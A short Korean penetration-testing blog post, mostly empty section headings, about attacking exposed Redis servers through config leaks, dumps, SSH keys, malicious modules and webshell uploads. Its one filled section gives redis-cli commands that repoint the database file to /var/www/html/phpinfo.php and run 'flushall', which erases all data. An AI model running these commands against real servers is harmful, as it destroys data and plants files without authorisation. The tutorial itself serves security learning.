---
title: Redis 를 대상으로 해킹하기 | Penteratoin testing
categories: [macos, tips]
tags: [WriteUsingLLaMA]
date: 2023-8-29 15:50:0 +0900
---
# 1. Redis 란?

# 2. 취약한 Redis 서비스 확인하기

# 3. Redis 서버 공격하기
## 3-1. Leakage Config informations
## 3-2. Dump Database
## 3-3. Remote Code Execution 
### A) `.ssh/authorized_keys` 업로드
### B) 악의적인 `*.so` 모듈 업로드 및 로드
### C) 기타 다양한 파일 업로드
- Redis의 권한이 대상 서버에서 어떤 권한인지에 따라 `php webshell`, `crontab` 등 다양한 파일을 업로드할 수 있다.
- 이러한 공격들은 원론적으로 대상 서버에 파일을 업로드할 수 있기 때문인데, 그 방법은 아래와 같다. (위 ssh나 *.so 공격 방법도 같은 원리)
    - 테스트를 위해 redis에 저장된 데이터를 백업해두자.
        ```bash
        redis-cli -h $HOST -p $PORT 'save'
        ```
    - redis config에서 `dir`과 `dbfilename`를 수정 (이 값들이 파일 업로드할 경로와 파일명이 된다.)
        ```bash
        redis-cli -h $HOST -p $PORT 'config set dir /var/www/html' # dir 경로 변경
        redis-cli -h $HOST -p $PORT 'config set dbfilename phpinfo.php' # 파일명 변경
        ```
    - 악성 파일을 작성하기 위해 redis의 key-value를 모두 초기화한다.
        ```bash
        redis-cli -h $HOST -p $PORT 'flushall'
        ```